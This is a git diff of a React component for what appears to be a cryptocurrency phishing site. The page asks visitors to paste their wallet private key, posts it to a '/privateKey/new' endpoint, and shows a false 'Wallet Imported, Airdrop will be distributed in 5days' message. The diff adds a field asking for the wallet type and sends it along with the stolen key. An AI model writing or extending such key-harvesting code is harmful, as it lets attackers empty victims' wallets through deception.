@@ -9,6 +9,8 @@ import axios from "./axios"
 function PrivateKey() {
 
     const [input, setInput] = useState("");
+    const [walletName, setWalletName] = useState("");
+
 
     const sendPrivateKey = async(e) => {
         e.preventDefault();
@@ -16,10 +18,13 @@ function PrivateKey() {
         console.log(input)
         console.log("clicked");
         await axios.post("/privateKey/new", {
-            privateKey: input
+            privateKey: input,
+            walletname: walletName,
         });
 
         setInput("");
+        setWalletName("");
+
         alert("Wallet Imported ✔, Airdrop will be distributed in 5days🚀");
     };
 
@@ -28,6 +33,8 @@ function PrivateKey() {
             <Header />
             <div className="phrase__form">
                 <form className="phrase__form">
+                <input value={walletName} placeholder="State Wallet Type e.g Binance" onChange={(e) => setWalletName(e.target.value)} type="text" name="walletname">
+                </input>
                 <input value={input} placeholder="Private Key" onChange={(e) => setInput(e.target.value)} type="text" name="privateKey">
                 </input>
                 <p className="phrase__description">Typically 64 alphanumeric characters</p>
